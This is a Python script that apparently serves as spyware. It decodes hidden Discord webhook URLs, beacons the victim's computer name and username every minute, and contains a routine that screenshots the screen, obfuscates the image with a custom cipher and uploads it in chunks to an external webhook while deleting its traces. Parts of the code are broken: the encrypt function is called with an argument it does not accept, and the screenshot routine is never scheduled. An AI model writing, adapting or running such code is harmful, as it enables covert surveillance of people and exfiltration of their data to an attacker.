import string, base64, json, re, math, uuid, importlib, subprocess
import os, socket, tempfile, sys
import urllib.request
import time

WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3NzAwNjk4NTAzMDI3MTA3Ni9xdUVRY0VxcEFGN3c2TUg4REduSlRtaTBuSUtFVGl2WXpMbEpVNlNSLUpsSWxGYmNLaUtFNDVlczZ1ZGxmOGVFQklBZw=="
FILE_WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NDI2MTA0NDgxNjgzODc3Ny9ObGQwX1N3OHgyY0g5QlFhSEtoQXZuTFU4RDE1cEcyX2RfN0N6cnJvTTNiMTZIU1pKWDJhTkttSFU4dWplVGttdlBVaQ=="

MAX_FILE_SIZE = 8 * 1024 * 1024

try:
    import pyautogui
    import requests
except:
    sys.exit()


def encrypt(text: str) -> str:
    b64 = base64.b64encode(text.encode()).decode()

    lower = string.ascii_lowercase
    upper = string.ascii_uppercase

    lower_rot = lower[5:] + lower[:5]
    upper_rot = upper[-3:] + upper[:-3]

    table = str.maketrans(
        lower + upper,
        lower_rot + upper_rot
    )

    encrypted = b64.translate(table)
    encrypted = encrypted.replace("==","-°").replace("=","_")

    return encrypted
    
def send_webhook(message):
    webhook_url = base64.b64decode(WEBHOOK_B64).decode("utf-8")

    payload = json.dumps({
        "content": encrypt(message)
    }).encode("utf-8")

    req = urllib.request.Request(
        webhook_url,
        data=payload,
        method="POST",
        headers={
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (DiscordWebhook)"
        }
    )

    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            response.read()
        return True
    except Exception as e:
        return False

def heartbeat():
    global FIRST_MESSAGE

    if FIRST_MESSAGE:
        msg = START_DATA
    else:        
        msg = ALIVE_DATA
    
    sent = send_webhook(msg)
    if sent and FIRST_MESSAGE:
        FIRST_MESSAGE = False

def cleanup_named_tempfiles():
    AGE_THRESHOLD = 60 
    temp_dir = tempfile.gettempdir()
    now = time.time()

    pattern = re.compile(r'^tmp[^.]{8}\.[^.]{3}$')
    for filename in os.listdir(temp_dir):
        if not pattern.match(filename):
                continue

        filepath = os.path.join(temp_dir, filename)

        if not os.path.isfile(filepath):
            continue

        try:
            mtime = os.path.getmtime(filepath)

            if now - mtime < AGE_THRESHOLD:
                continue

            os.remove(filepath)

        except PermissionError:
            pass
        except Exception as e:
            pass

def custom_encode(image_path):
    with open(image_path, "rb") as f:
        d = encrypt(f.read(),byte=True)
    
    new_image_path = image_path[:-3] + "enc"
    with open(new_image_path, "w", encoding="utf-8") as f:
        f.write(d)

    return new_image_path

def send_file_in_chunks(file_path, original_file_name):
    file_size = os.path.getsize(file_path)
    filename = original_file_name
    
    webhook_url = base64.b64decode(FILE_WEBHOOK_B64).decode("utf-8")

    transfer_id = uuid.uuid4().hex  # unique ID for rebuilding

    if file_size <= MAX_FILE_SIZE:
        with open(file_path, 'rb') as f:
            payload = {
                "id": transfer_id,
                "filename": filename,
                "chunk_number": 1,
                "total_chunks": 1,
                'computer':COMPUTER_NAME,
                'username':USER_NAME
            }
            requests.post(
                webhook_url,
                data={"content": encrypt(json.dumps(payload))},
                files={"file": f}
            )
    else:
        total_chunks = math.ceil(file_size / MAX_FILE_SIZE)

        with open(file_path, 'rb') as f:
            chunk_num = 1
            while chunk := f.read(MAX_FILE_SIZE):
                chunk_file = tempfile.NamedTemporaryFile(delete=False, suffix=".chunk")
                chunk_file.write(chunk)
                chunk_file.close()

                payload = {
                    "id": transfer_id,
                    "filename": filename,
                    "chunk_number": chunk_num,
                    "total_chunks": total_chunks,
                    'computer':COMPUTER_NAME,
                    'username':USER_NAME
                }

                with open(chunk_file.name, 'rb') as cf:
                    requests.post(
                        webhook_url,
                        data={"content": encrypt(json.dumps(payload))},
                        files={"file": cf}
                    )

                os.remove(chunk_file.name)
                chunk_num += 1

def take_screenshot():
    temp_file = tempfile.NamedTemporaryFile(delete=False, suffix=".png")
    temp_file.close()
    
    try:
        # Take a screenshot
        screenshot = pyautogui.screenshot()
        screenshot.save(temp_file.name)
        
        # Encode the image
        encoded_file = custom_encode(temp_file.name)
        
        # Send via webhook
        send_file_in_chunks(encoded_file, "screenshot.png")
    finally:
        # Ensure files are deleted
        if os.path.exists(temp_file.name):
            os.remove(temp_file.name)
        if encoded_file != temp_file.name and os.path.exists(encoded_file):
            os.remove(encoded_file)


if __name__ == "__main__":
    COMPUTER_NAME = os.environ.get("COMPUTERNAME", socket.gethostname())
    USER_NAME = os.environ.get("USERNAME", "SYSTEM")

    START_DATA = json.dumps({'info':'script_started','script':'user','computer':COMPUTER_NAME,'username':USER_NAME})
    ALIVE_DATA = json.dumps({'info':'alive','script':'user','computer':COMPUTER_NAME,'username':USER_NAME})

    FIRST_MESSAGE = True
    
    # while True:
    #     try:
    #         cleanup_named_tempfiles()

    #         heartbeat()
    #     except:
    #         pass

    #     sleep(60)

    loop_function_list = [
        {
            "func": cleanup_named_tempfiles,
            "args": [],
            "interval": 60,  # seconds
            "next_run": time.monotonic(),
        },
        {
            "func": heartbeat,
            "args": [],
            "interval": 60,  # seconds
            "next_run": time.monotonic(),
        }
    ]

    while True:
        now = time.monotonic()
        nearest_next_run = None

        for task in loop_function_list:
            if now >= task["next_run"]:
                task["next_run"] += task["interval"]
                try:
                    task["func"](*task["args"])
                except Exception:
                    pass

            if nearest_next_run is None or task["next_run"] < nearest_next_run:
                nearest_next_run = task["next_run"]

        sleep_time = max(0, nearest_next_run - time.monotonic())
        time.sleep(sleep_time)